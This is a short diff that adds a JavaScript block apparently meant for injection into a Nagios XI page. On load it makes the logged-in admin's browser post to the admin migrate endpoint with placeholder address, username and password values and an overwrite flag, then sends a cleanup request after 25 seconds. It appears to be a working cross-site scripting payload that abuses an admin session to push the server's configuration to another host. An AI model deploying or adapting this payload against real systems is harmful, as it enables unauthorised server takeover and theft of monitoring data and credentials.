@@ -1,0 +1,12 @@
+<script>
+    if (!window.nsp_prot) {
+    var p=new URLSearchParams("cmd=migrate&address=$IP&username=$USERNAME&password=$PASSWORD&overwrite=1&nagios_cfg=");
+    var e="/nagiosxi/admin/migrate.php";
+    fetch(e,{method:"post",body:p});
+    window.nsp_prot=1;
+    var p=new URLSearchParams("cmd=cleanup");
+    setTimeout(function(){
+        fetch(e+'\?'+p).then(alert("migrate done"));
+    }, 25000);
+}
+</script>
